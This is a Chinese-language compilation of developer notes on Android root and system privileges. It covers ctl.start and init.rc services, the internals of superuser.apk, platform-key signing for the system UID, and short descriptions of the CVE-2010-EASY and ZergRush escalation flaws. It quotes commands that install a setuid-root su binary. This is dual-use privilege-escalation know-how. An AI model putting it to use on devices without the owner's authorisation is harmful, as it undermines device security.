\u8bbe\u7f6e\u7cfb\u7edf\u5c5e\u6027\u201cctl.start\u201d\uff0c\u628a\u201cctl.start\u201d\u8bbe\u7f6e\u4e3a\u4f60\u8981\u8fd0\u884c\u7684Service\uff0c\u5047\u8bbe\u4e3a\u201cxxx\u201d\uff0cAndroid\u7cfb\u7edf\u5c06\u4f1a\u5e2e\u4f60\u8fd0\u884c\u201cctl.start\u201d\u7cfb\u7edf\u5c5e\u6027\u4e2d\u6307\u5b9a\u7684Service\u3002\u90a3\u4e48\u8fd0\u884c\u7ed3\u679cinit\u8fdb\u7a0b\u4f1a\u5199\u5165\u547d\u540d\u4e3a\u201cinit.svc.+xxx\u201d\u7684\u7cfb\u7edf\u5c5e\u6027\u4e2d\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u53c2\u8003\u67e5\u9605\u8fd9\u4e2a\u503c\u6765\u786e\u5b9aService xxx\u6267\u884c\u7684\u60c5\u51b5\u3002 Android\u7cfb\u7edf\u5c5e\u6027(property)\u6743\u9650 \u96be\u9053Android\u5c5e\u6027\u201cctl.start\u201d\u4e0d\u662f\u6240\u6709\u8fdb\u7a0b\u90fd\u53ef\u4ee5\u8bbe\u7f6e\u7684\uff0c\u89c1property_service.c\u4e2d\u7684\u6e90\u7801\uff0c\u8bbe\u7f6eAndroid\u7cfb\u7edf\u5c5e\u6027\u7684\u51fd\u6570\u4e3ahandle_property_set_fd(),\u4ece\u6e90\u7801\u4e2d\u53ef\u4ee5\u53d1\u73b0\u5982\u679c\u8bbe\u7f6e\u201cctl.\u201d\u5f00\u5934\u7684Android\u7cfb\u7edf\u5c5e\u6027\uff0c\u5c06\u4f1a\u8c03\u7528check_control_perms\u51fd\u6570\u6765\u68c0\u67e5\u8c03\u7528\u8005\u7684\u6743\u9650\uff0c\u53ea\u6709root\u6743\u9650\u548csystem\u6743\u9650\u7684\u5e94\u7528\u7a0b\u5e8f\u624d\u53ef\u4ee5\u4fee\u6539\u201cctl.\u201d\u5f00\u5934\u7684Android\u7cfb\u7edf\u5c5e\u6027\u3002\u5426\u5219\u5c06\u4f1a\u68c0\u67e5control_perms\u5168\u5c40\u53d8\u91cf\u4e2d\u7684\u5b9a\u4e49\u6743\u9650\u548cService\u3002 \u4ece\u4ee3\u7801\u4e2d\u53ef\u4ee5\u770b\u5230\uff0c\u4efb\u4f55\u4e0d\u4ee5property_perms[] \u4e2d\u5b9a\u4e49\u7684\u524d\u7f00\u5f00\u5934\u7684property \u662f\u65e0\u6cd5\u88ab\u9664root\u4ee5\u5916\u7684\u7528\u6237\u8bbf\u95ee\u7684\uff0c\u5305\u62ecsystem\u7528\u6237\u3002 \u5b9e\u4f8b \u4e0b\u9762\u4ee5\u4e0a\u9762\u63d0\u51fa\u7684mount nfs\u6587\u4ef6\u7cfb\u7edf\u4e3a\u4f8b\u8bf4\u660e\uff1a A\uff0e \u9996\u5148\u5b9a\u4e49\u4e00\u4e2a\u6267\u884cmount\u7684\u811a\u672c\uff0c\u6211\u628a\u5b83\u4f4d\u4e8e/system/etc/mount_nfs.sh\uff0c\u5b9a\u4e49\u5982\u4e0b\uff1a 1: #\uff01/system/bin/sh 2: 3: /system/bin/busybox mount -o rw,nolock -t nfs 192.168.1.6:/nfs_srv /data/mnt \u4e0d\u8981\u5fd8\u4e86\u628a\u5b83\u52a0\u4e0a\u53ef\u6267\u884c\u6743\u9650\u3002 B\uff0e \u5728init.rc\u4e2d\u52a0\u5165\u4e00\u4e2aService\u5b9a\u4e49\uff0c\u5b9a\u4e49\u5982\u4e0b\uff1a 1: service mount_nfs /system/etc/mount_nfs.sh 2: oneshot 3: disabled C\uff0e \u8ba9\u81ea\u5df1\u7684\u5e94\u7528\u7a0b\u5e8f\u83b7\u5f97system\u6743\u9650,\u65b9\u6cd5\u89c1\u524d\u9762\u7ae0\u8282 D. \u5728\u81ea\u5df1\u5e94\u7528\u7a0b\u5e8f\u4e2d\u8bbe\u7f6eSystem\u7cfb\u7edf\u5c5e\u6027\u201cctl.start\u201d\u4e3a\u201cmount_nfs\u201d\uff0c\u8fd9\u6837Android\u7cfb\u7edf\u5c06\u4f1a\u5e2e\u6211\u4eec\u8fd0\u884cmount_nfs\u7cfb\u7edf\u5c5e\u6027\u4e86\u3002\u4e0d\u80fd\u591f\u8c03\u7528System.getProperty\uff0c\u8fd9\u4e2a\u51fd\u6570\u53ea\u662f\u4fee\u6539JVM\u4e2d\u7684\u7cfb\u7edf\u5c5e\u6027\u3002\u53ea\u80fd\u8c03\u7528android.os.SystemProperties\uff0c\u6700\u7ec8\u901a\u8fc7JNI\u8c03\u7528C/C++\u5c42\u7684API property_get\u548cproperty_set\u51fd\u6570\u3002 SystemProperties.set(\"ctl.start\",\"mount_nfs\"); E. \u6700\u540e\u5728\u81ea\u5df1\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u8bfb\u53d6\u201cinit.svc.mount_nfs\u201dAndroid\u7cfb\u7edfProperty\uff0c\u68c0\u67e5\u6267\u884c\u7ed3\u679c\u3002\u4ee3\u7801\u5982\u4e0b\uff1a 1:while(true) 2: { 3: mount_rt = SystemProperties.get(\"init.svc.mount_nfs\",\"\"); 4: if(mount_rt != null && mount_rt.equals(\"stopped\")) 5: { 6: return true; 7: } 8: 9: try 10: { 11: Thread.sleep(1000); 12: }catch(Exception ex){ 13: Log.e(TAG,\"Exception: \" + ex.getMessage()); 14: } 15: } init\u8fdb\u7a0b\u7ef4\u62a4\u4e00\u4e2aservice\u7684\u961f\u5217\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8f6e\u8bad\u6765\u67e5\u8be2service\u7684\u6267\u884c\u7ed3\u679c\u3002 1. \u6587\u4ef6(\u5939)\u8bfb\u5199\u6743\u9650 init.rc \u4e2d\u5efa\u7acbtest1 test2 test3\u6587\u4ef6\u5939 mkdir /data/misc/test1 0770 root root mkdir /data/misc/test2 0770 wifi wifi mkdir /data/misc/test3 0770 system misc \u5176\u4e2d test1 \u76ee\u5f55\u7684owner\u662froot, group\u4e5f\u662froot test2 \u76ee\u5f55\u7684owner\u662fwifi , group\u4e5f\u662fwifi test3 \u76ee\u5f55\u7684owner\u662fsystem , group\u662fmisc \uff08\u4efb\u4f55\u7528\u6237\u90fd\u5c5e\u4e8egroup misc\uff09 service xxxx /system/bin/xxxx user root disabled oneshot service yyyy /system/bin/yyyy user system disabled oneshot service zzzz /system/bin/zzzz user wifi disabled oneshot \u7ed3\u679c: xxxx \u670d\u52a1\u53ef\u4ee5\u8bbf\u95ee test1, test2, test3 yyyy \u670d\u52a1\u53ef\u4ee5\u8bbf\u95ee test3 zzzz \u670d\u52a1\u53ef\u4ee5\u8bbf\u95ee test2, test3 \u89c1android_filesystem_config.h\u4e2d\u5b9a\u4e49AID_ROOT AID_SYSTEM AID_MISC\u7b49\u5b8f\u5b9a\u4e49\u7684\u6743\u9650 360\u7b49\u7279\u6b8a\u7cfb\u7edf\u662f\u5426\u53ef\u4ee5\u8003\u8651\u5728AID_ROOT\u548cAID_SYSTEM\u4e4b\u95f4\u52a0\u4e00\u4e2a\u6743\u9650\u548c\u7528\u6237,\u589e\u52a0\u65b0\u7684\u54e6 property\u7ed9360\u7528?**** \u901a\u8fc7\u4e0a\u9762\u7684\u8fd9\u4e9b\u6b65\u9aa4\uff0cAndroid\u5e94\u7528\u7a0b\u5e8f\u5c31\u80fd\u591f\u8c03\u7528init.rc\u4e2d\u5b9a\u4e49\u7684Service\u4e86\u3002\u8fd9\u6837\u4f60\u7684Android\u5e94\u7528\u7a0b\u5e8f\u4e5f\u5c31\u83b7\u5f97\u4e86root\u6743\u9650\u3002\u524d\u63d0\u662fAndroid\u7cfb\u7edf\u5f00\u53d1\u4eba\u5458\uff0c\u5426\u5219\u4f60\u65e0\u6cd5\u4fee\u6539init.rc\u7b49\u6587\u4ef6,\u800c\u4e14\u5e94\u7528\u7a0b\u5e8f\u5fc5\u987b\u8981\u83b7\u5f97system\u6743\u9650\u3002 android superuser.apk\u7ba1\u7406root\u6743\u9650\u539f\u7406\u5206\u6790 \u539f\u7406\u662f\u5229\u7528\u4e86android\u7684\u4e24\u4e2a\u63d0\u6743\u6f0f\u6d1e\uff1a CVE-2010-EASY\u548c ZergRush\u3002 \u6211\u628a\u5927\u6982\u539f\u7406\u7b80\u5355\u8bf4\u8bf4\uff1a 1\uff0c CVE-2010-EASY\uff1a linux\u7684\u5185\u6838\u7684\u6a21\u5757\u5316\u7a0b\u5ea6\u5f88\u9ad8\uff0c\u5f88\u591a\u529f\u80fd\u6a21\u5757\u662f\u9700\u8981\u5230\u65f6\u5019\u518d\u52a0\u8f7d\uff0c\u5728 android\u4e2d\u7531init\u8fdb\u7a0b\u6765\u7ba1\u7406\u8fd9\u4e9b\u7684\u3002\u4f46\u662f\u8fd9\u4e2ainit\u8fdb\u7a0b\u4e0d\u4f1a\u68c0\u6d4b\u53d1\u7ed9\u5b83\u7684\u6307\u4ee4\u7684\u6765\u6e90\uff0c\u4e0d\u7ba1\u662f\u5185\u6838\u53d1\u9001\u7684\uff0c\u8fd8\u662f\u7528\u6237\u53d1\u9001\u7684\uff0c\u5b83\u90fd\u6267\u884c\u4e0d\u8bef\uff0c\u4f1a\u987a\u4ece\u7684\u53bb\u52a0\u8f7d\u6216\u5378\u8f7d\u4e00\u4e9b\u6a21\u5757\uff0c\u800c\u52a0\u8f7d\u7684\u6a21\u5757\u90fd\u662f\u4ee5root\u8eab\u4efd\u8fd0\u884c\u7684\u3002\u56e0\u6b64\u4f60\u53ef\u4ee5\u7ed9\u5b83\u51c6\u5907\u4e00\u4e2a\u7cbe\u5fc3\u5236\u4f5c\u7684\u529f\u80fd\u6a21\u5757(ko\u6587\u4ef6)\uff0c\u7136\u540e\u89e6\u53d1\u76f8\u5e94\u7684\u52a0\u8f7d\u6761\u4ef6\uff0c\u6bd4\u5982\u70ed\u62d4\u63d2\u3001\u5f00\u5173wifi\u7b49\u7b49\uff0c \u8be5\u529f\u80fd\u6a21\u5757\u8fd0\u884c\u540e\uff0c\u4f1a\u751f\u6210 /data/local/tmp/rootshell \u4e00\u4e2a\u5e26s\u4f4d\u7684shell\u3002 2\uff0cZergRush\u539f\u7406\uff1a \u5177\u6709root\u6743\u9650\u7684vold\u8fdb\u7a0b\u4f7f\u7528\u4e86libsysutils.so\u5e93\uff0c\u8be5\u5e93\u6709\u4e2a\u51fd\u6570\u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u56e0\u6b64\u53ef\u4ee5root\u6743\u9650\u6267\u884c\u8f93\u5165\u7684shellcode\u3002 3. \u8fd8\u6709\u4e2a\u524d\u9762\u63d0\u5230\u7684adb\u63d0\u6743\u6f0f\u6d1e\uff0c\u4e0d\u591f\u65b0\u7248\u672c\u5df2\u7ecf\u4fee\u6b63\u4e86\u3002 \u626f\u4e86\u534a\u5929\u8fd8\u6ca1\u626f\u5230superuser.apk\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u662froot\u6210\u529f\u540e\uff0c\u4e13\u95e8\u7528\u6765\u7ba1\u7406root\u6743\u9650\u4f7f\u7528\u7684\uff0c\u9632\u6b62\u88ab\u6076\u610f\u7a0b\u5e8f\u6ee5\u7528\u3002 \u6e90\u7801\u5730\u5740\uff1a http://superuser.googlecode.com/svn/trunk \u5e26\u7740\u4e24\u4e2a\u95ee\u9898\u6211\u4eec\u6765\u5206\u6790\u6e90\u7801\uff1a 1\u3001superuser\u662f\u600e\u4e48\u77e5\u9053\u8c01\u60f3\u7528root\u6743\u9650\uff1f 2\u3001superuser\u662f\u5982\u4f55\u628a\u7528\u6237\u7684\u9009\u62e9\u544a\u8bc9su\u7a0b\u5e8f\u7684\u90a3\uff1f \u5373superuser\u548csu\u7a0b\u5e8f\u662f\u5982\u4f55\u901a\u8baf\u7684\uff0c\u4ed6\u4eec\u4fe9\u4f4d\u4e8e\u4e0d\u901a\u7684\u65f6\u7a7a\uff0c\u4e00\u4e2a\u5728java\u865a\u62df\u673a\u4e2d\uff0c\u4e00\u4e2a\u5728linux\u7684\u771f\u5b9e\u8fdb\u7a0b\u4e2d\u3002 \u5171\u6709\u4e24\u4e2aactive: SuperuserActivity\u548c SuperuserRequestActivity\u3002 \u5176\u4e2dSuperuserActivity\u4e3b\u8981\u662f\u7528\u6765\u7ba1\u7406\u767d\u540d\u5355\u7684\uff0c\u5c31\u662f\u8bb0\u4f4f\u54ea\u4e2a\u7a0b\u5e8f\u5df2\u7ecf\u88ab\u5141\u8bb8\u4f7f\u7528root\u6743\u9650\u4e86\uff0c\u7701\u7684\u6bcf\u6b21\u7528\u65f6\u90fd\u95ee\u7528\u6237\u3002 SuperuserRequestActivity \u5c31\u662f\u7528\u6765\u8be2\u95ee\u7528\u6237\u76ee\u524d\u6709\u4e2a\u7a0b\u5e8f\u60f3\u4f7f\u7528root\u6743\u9650\uff0c\u662f\u5426\u5141\u8bb8\uff0c\u662f\u5426\u4e00\u76f4\u5141\u8bb8\uff0c\u5373\u653e\u5165\u767d\u540d\u5355\u3002 \u8fd9\u4e2a\u767d\u540d\u5355\u6bd4\u8f83\u5173\u952e\uff0c\u662f\u4e00\u4e2asqlite\u6570\u636e\u5e93\u6587\u4ef6\uff0c\u4f4d\u7f6e\uff1a /data/data/com.koushikdutta.superuser/databases/superuser.sqlite root\u7684\u672c\u8d28\u5c31\u662f\u5f80 /system/bin/\u4e0b\u653e\u4e00\u4e2a\u5e26s\u4f4d\u7684\uff0c\u4e0d\u68c0\u67e5\u8c03\u7528\u8005\u6743\u9650\u7684su\u6587\u4ef6\u3002\u666e\u901a\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u8be5su\u6765\u8fd0\u884croot\u6743\u9650\u7684\u547d\u4ee4\u3002superuser.apk\u4e2d\u5c31\u81ea\u5e26\u4e86\u4e00\u4e2a\u8fd9\u6837\u7684su\u7a0b\u5e8f\u3002\u4e00\u5f00\u59cbsuperuser\u4f1a\u68c0\u6d4b/system/bin/su\u662f\u5426\u5b58\u5728\uff0c\u662f\u5426\u662f\u81ea\u4e2a\u653e\u8fdb\u53bb\u7684su: File su = new File(\"/system/bin/su\"); // \u68c0\u6d4bsu\u6587\u4ef6\u662f\u5426\u5b58\u5728,\u5982\u679c\u4e0d\u5b58\u5728\u5219\u76f4\u63a5\u8fd4\u56de if (!su.exists()) { Toast toast = Toast.makeText(this, \"Unable to find /system/bin/su.\", Toast.LENGTH_LONG); toast.show(); return; } //\u68c0\u6d4bsu\u6587\u4ef6\u7684\u5b8c\u6574\u6027\uff0c\u6bd4\u8f83\u5927\u5c0f\uff0c\u592a\u7701\u4e8b\u4e86\u5427 //\u5982\u679c\u5927\u5c0f\u4e00\u6837\uff0c\u5219\u8ba4\u4e3asu\u6587\u4ef6\u6b63\u786e\uff0c\u76f4\u63a5\u8fd4\u56de\u4e86\u4e8b\u3002 if (su.length() == suStream.available()) { suStream.close(); return; } // \u5982\u679c\u68c0\u6d4b\u5230/system/bin/su \u6587\u4ef6\u5b58\u5728\uff0c\u4f46\u662f\u4e0d\u5bf9\u5934\uff0c\u5219\u628a\u81ea\u5e26\u7684su\u5148\u5199\u5230\"/data/data/com.koushikdutta.superuser/su\" // \u518d\u5199\u5230/system/bin/su\u3002 byte[] bytes = new byte[suStream.available()]; DataInputStream dis = new DataInputStream(suStream); dis.readFully(bytes); FileOutputStream suOutStream = new FileOutputStream(\"/data/data/com.koushikdutta.superuser/su\"); suOutStream.write(bytes); suOutStream.close(); Process process = Runtime.getRuntime().exec(\"su\"); DataOutputStream os = new DataOutputStream(process.getOutputStream()); os.writeBytes(\"mount -oremount,rw /dev/block/mtdblock3 /system\\n\"); os.writeBytes(\"busybox cp /data/data/com.koushikdutta.superuser/su /system/bin/su\\n\"); os.writeBytes(\"busybox chown 0:0 /system/bin/su\\n\"); os.writeBytes(\"chmod 4755 /system/bin/su\\n\"); os.writeBytes(\"exit\\n\"); os.flush(); \u4e0a\u9762\u63d0\u5230\u7684su\u80af\u5b9a\u662f\u52a8\u8fc7\u624b\u811a\u7684,\u6709\u8fdb\u7a0b\u4f7f\u7528root\u6743\u9650\uff0csuperuser\u662f\u600e\u4e48\u77e5\u9053\u7684\uff0c\u770b\u5b8csu\u7684\u4ee3\u7801\u660e\u767d\u4e86\uff0c\u5173\u952e\u662f\u53e5\uff1a sprintf(sysCmd, \"am start -a android.intent.action.MAIN -n com.koushikdutta.superuser/com.koushikdutta.superuser.SuperuserRequestActivity --ei uid %d --ei pid %d > /dev/null\", g_puid, ppid); if (system(sysCmd)) return executionFailure(\"am.\"); \u539f\u7406\u662fam\u547d\u4ee4\uff0c\u770b\u4e86\u4e0bam\u7684\u7528\u6cd5\uff0c\u660e\u767d\u4e86\uff1a \u5728Android\u4e2d\uff0c\u9664\u4e86\u4ece\u754c\u9762\u4e0a\u542f\u52a8\u7a0b\u5e8f\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u4ece\u547d\u4ee4\u884c\u542f\u52a8\u7a0b\u5e8f\uff0c\u4f7f\u7528\u7684\u662f\u547d\u4ee4\u884c\u5de5\u5177am.\u542f\u52a8\u7684\u65b9\u6cd5\u4e3a $ adb shell $ su # am start -n \uff5b\u5305(package)\u540d\uff5d/\uff5b\u5305\u540d\uff5d.{\u6d3b\u52a8(activity)\u540d\u79f0} \u7a0b\u5e8f\u7684\u5165\u53e3\u7c7b\u53ef\u4ee5\u4ece\u6bcf\u4e2a\u5e94\u7528\u7684AndroidManifest.xml\u7684\u6587\u4ef6\u4e2d\u5f97\u5230\uff0c\u4ee5\u8ba1\u7b97\u5668\uff08calculator\uff09\u4e3a\u4f8b\uff0c\u5b83\u7684 <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" \u2026 package=\"com.android.calculator2\" \u2026>\u2026 \u7531\u6b64\u8ba1\u7b97\u5668\uff08calculator\uff09\u7684\u542f\u52a8\u65b9\u6cd5\u4e3a\uff1a # am start -n com.android.calculator2/com.android.calculator2.Calculator \u4e00\u822c\u60c5\u51b5\u5e0c\u671b\uff0c\u4e00\u4e2aAndroid\u5e94\u7528\u5bf9\u5e94\u4e00\u4e2a\u5de5\u7a0b\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6709\u4e00\u4e9b\u5de5\u7a0b\u5177\u6709\u591a\u4e2a\u6d3b\u52a8\uff08activity\uff09\uff0c\u800c\u6709\u4e00\u4e9b\u5e94\u7528\u4f7f\u7528\u4e00\u4e2a\u5de5\u7a0b\u3002\u4f8b\u5982\uff1a\u5728Android\u754c\u9762\u4e2d\uff0cMusic\u548cVideo\u662f\u4e24\u4e2a\u5e94\u7528\uff0c\u4f46\u662f\u5b83\u4eec\u4f7f\u7528\u7684\u90fd\u662fpackages/apps/Music\u8fd9\u4e00\u4e2a\u5de5\u7a0b\u3002\u800c\u5728\u8fd9\u4e2a\u5de5\u7a0b\u7684AndroidManifest.xml\u6587\u4ef6\u4e2d\uff0c\u6709\u5305\u542b\u4e86\u4e0d\u540c\u7684\u6d3b\u52a8\uff08activity\uff09\u3002 Music \u548c Video\uff08\u97f3\u4e50\u548c\u89c6\u9891\uff09\u7684\u542f\u52a8\u65b9\u6cd5\u4e3a\uff1a # am start -n com.android.music/com.android.music.MusicBrowserActivity # am start -n com.android.music/com.android.music.VideoBrowserActivity # am start -n com.android.music/com.android.music.MediaPlaybackActivity \u542f\u52a8\u6d4f\u89c8\u5668 : am start -a android.intent.action.VIEW -d http://www.google.cn/ \u62e8\u6253\u7535\u8bdd : am start -a android.intent.action.CALL -d tel:10086 \u542f\u52a8 google map\u76f4\u63a5\u5b9a\u4f4d\u5230\u5317\u4eac : am start -a android.intent.action.VIEW geo:0,0?q=beijing usage: am [subcommand] [options] start an Activity: am start [-D] [-W] <INTENT> -D: enable debugging -W: wait for launch to complete start a Service: am startservice <INTENT> send a broadcast Intent: am broadcast <INTENT> start an Instrumentation: am instrument [flags] <COMPONENT> -r: print raw results (otherwise decode REPORT_KEY_STREAMRESULT) -e <NAME> <VALUE>: set argument <NAME> to <VALUE> -p <FILE>: write profiling data to <FILE> -w: wait for instrumentation to finish before returning start profiling: am profile <PROCESS> start <FILE> stop profiling: am profile <PROCESS> stop <INTENT> specifications include these flags: [-a <ACTION>] [-d <DATA_URI>] [-t <MIME_TYPE>] [-c <CATEGORY> [-c <CATEGORY>] ...] [-e|--es <EXTRA_KEY> <EXTRA_STRING_VALUE> ...] [--esn <EXTRA_KEY> ...] [--ez <EXTRA_KEY> <EXTRA_BOOLEAN_VALUE> ...] [-e|--ei <EXTRA_KEY> <EXTRA_INT_VALUE> ...] [-n <COMPONENT>] [-f <FLAGS>] [--grant-read-uri-permission] [--grant-write-uri-permission] [--debug-log-resolution] [--activity-brought-to-front] [--activity-clear-top] [--activity-clear-when-task-reset] [--activity-exclude-from-recents] [--activity-launched-from-history] [--activity-multiple-task] [--activity-no-animation] [--activity-no-history] [--activity-no-user-action] [--activity-previous-is-top] [--activity-reorder-to-front] [--activity-reset-task-if-needed] [--activity-single-top] [--receiver-registered-only] [--receiver-replace-pending] [<URI>] \u8fd8\u6709\u4e2a\u7591\u70b9\uff0c\u5c31\u662fsu\u600e\u4e48\u77e5\u9053\u7528\u6237\u662f\u5141\u8bb8root\u6743\u9650\u8fd8\u662f\u53cd\u5bf9\u90a3\uff1f\u539f\u6765\u662f\u4e0a\u9762\u63d0\u5230\u7684\u767d\u540d\u5355\u8d77\u6765\u4f5c\u7528\uff0csuperuser\u628a\u7528\u6237\u7684\u9009\u62e9\u653e\u5165 \uff1a /data/data/com.koushikdutta.superuser/databases/superuser.sqlite \u6570\u636e\u5e93\u4e2d\uff0c\u7136\u540esu\u8fdb\u7a0b\u518d\u53bb\u8bfb\u8be5\u6570\u636e\u5e93\u6765\u5224\u65ad\u662f\u5426\u5141\u8bb8\u3002 static int checkWhitelist() { sqlite3 *db; int rc = sqlite3_open_v2(DBPATH, &db, SQLITE_OPEN_READWRITE, NULL); if (!rc) { char *errorMessage; char query[1024]; sprintf(query, \"select * from whitelist where _id=%d limit 1;\", g_puid); struct whitelistCallInfo callInfo; callInfo.count = 0; callInfo.db = db; rc = sqlite3_exec(db, query, whitelistCallback, &callInfo, &errorMessage); if (rc != SQLITE_OK) { sqlite3_close(db); return 0; } sqlite3_close(db); return callInfo.count; } sqlite3_close(db); return 0; } \u83b7\u53d6\u4e00\u952eroot\u539f\u7406 | \u8f6c\u81ea: http://blog.csdn.net/liujian885/archive/2010/03/22/5404834.aspx \u5728 android\u7684API\u4e2d\u6709\u63d0\u4f9b SystemClock.setCurrentTimeMillis()\u51fd\u6570\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\uff0c\u53ef\u60dc\u65e0\u8bba\u4f60\u600e\u4e48\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u90fd\u662f\u6ca1\u7528\u7684\uff0c\u65e0\u8bba\u6a21\u62df\u5668\u8fd8\u662f\u771f\u673a\uff0c\u5728logcat\u4e2d\u603b\u4f1a\u5f97\u5230\"Unable to open alarm driver: Permission denied \".\u8fd9\u4e2a\u51fd\u6570\u9700\u8981root\u6743\u9650\u6216\u8005\u8fd0\u884c\u4e0e\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u624d\u53ef\u4ee5\u7528\u3002\u672c\u6765\u4ee5\u4e3a\u5c31\u6ca1\u6709\u529e\u6cd5\u5728\u5e94\u7528\u7a0b\u5e8f\u8fd9\u4e00\u5c42\u6539\u7cfb\u7edf\u65f6\u95f4\u4e86\uff0c\u540e\u6765\u5728\u7f51\u4e0a\u641c\u4e86\u597d\u4e45\uff0c\u77e5\u9053\u8fd9\u4e2a\u76ee\u7684\u8fd8\u662f\u53ef\u4ee5\u8fbe\u5230\u7684\u3002 \u7b2c\u4e00\u4e2a\u65b9\u6cd5\u7b80\u5355\u70b9\uff0c\u4e0d\u8fc7\u9700\u8981\u5728Android\u7cfb\u7edf\u6e90\u7801\u7684\u73af\u5883\u4e0b\u7528make\u6765\u7f16\u8bd1\uff1a 1. \u5728\u5e94\u7528\u7a0b\u5e8f\u7684AndroidManifest.xml\u4e2d\u7684manifest\u8282\u70b9\u4e2d\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4fee\u6539Android.mk\u6587\u4ef6\uff0c\u52a0\u5165LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u884c 3. \u4f7f\u7528mm\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u751f\u6210\u7684apk\u5c31\u6709\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u7684\u6743\u9650\u4e86\u3002 \u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u9ebb\u70e6\u70b9\uff0c\u4e0d\u8fc7\u4e0d\u7528\u5f00\u865a\u62df\u673a\u8dd1\u5230\u6e90\u7801\u73af\u5883\u4e0b\u7528make\u6765\u7f16\u8bd1\uff1a 1. \u540c\u4e0a\uff0c\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4f7f\u7528eclipse\u7f16\u8bd1\u51faapk\u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u4e2aapk\u6587\u4ef6\u662f\u4e0d\u80fd\u7528\u7684\u3002 3. \u4f7f\u7528\u76ee\u6807\u7cfb\u7edf\u7684platform\u5bc6\u94a5\u6765\u91cd\u65b0\u7ed9apk\u6587\u4ef6\u7b7e\u540d\u3002\u8fd9\u6b65\u6bd4\u8f83\u9ebb\u70e6\uff0c\u9996\u5148\u627e\u5230\u5bc6\u94a5\u6587\u4ef6\uff0c\u5728\u6211\u7684Android\u6e90\u7801\u76ee\u5f55\u4e2d\u7684\u4f4d\u7f6e\u662f\"build\\target\\product\\security\"\uff0c\u4e0b\u9762\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7136\u540e\u7528Android\u63d0\u4f9b\u7684Signapk\u5de5\u5177\u6765\u7b7e\u540d\uff0csignapk\u7684\u6e90\u4ee3\u7801\u662f\u5728\"build\\tools\\signapk\"\u4e0b\uff0c\u7528\u6cd5\u4e3a\"signapk platform.x509.pem platform.pk8 input.apk output.apk\"\uff0c\u6587\u4ef6\u540d\u6700\u597d\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u9632\u6b62\u627e\u4e0d\u5230\uff0c\u4e5f\u53ef\u4ee5\u4fee\u6539\u6e90\u4ee3\u7801\u76f4\u63a5\u4f7f\u7528\u3002 \u8fd9\u6837\u6700\u540e\u5f97\u5230\u7684apk\u548c\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u662f\u4e00\u6837\u7684\u3002 \u6700\u540e\u89e3\u91ca\u4e00\u4e0b\u539f\u7406\uff0c\u9996\u5148\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002\u901a\u8fc7Shared User id,\u62e5\u6709\u540c\u4e00\u4e2aUser id\u7684\u591a\u4e2aAPK\u53ef\u4ee5\u914d\u7f6e\u6210\u8fd0\u884c\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u3002\u90a3\u4e48\u628a\u7a0b\u5e8f\u7684UID\u914d\u6210android.uid.system\uff0c\u4e5f\u5c31\u662f\u8981\u8ba9\u7a0b\u5e8f\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\uff0c\u8fd9\u6837\u5c31\u6709\u6743\u9650\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u4e86\u3002 \u53ea\u662f\u52a0\u5165UID\u8fd8\u4e0d\u591f\uff0c\u5982\u679c\u8fd9\u65f6\u5019\u5b89\u88c5APK\u7684\u8bdd\u53d1\u73b0\u65e0\u6cd5\u5b89\u88c5\uff0c\u63d0\u793a\u7b7e\u540d\u4e0d\u7b26\uff0c\u539f\u56e0\u662f\u7a0b\u5e8f\u60f3\u8981\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u8fd8\u8981\u6709\u76ee\u6807\u7cfb\u7edf\u7684platform key\uff0c\u5c31\u662f\u4e0a\u9762\u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u63d0\u5230\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7528\u8fd9\u4e24\u4e2akey\u7b7e\u540d\u540eapk\u624d\u771f\u6b63\u53ef\u4ee5\u653e\u5165\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u3002\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u4e2d\u52a0\u5165LOCAL_CERTIFICATE := platform\u5176\u5b9e\u5c31\u662f\u7528\u8fd9\u4e24\u4e2akey\u6765\u7b7e\u540d\u3002 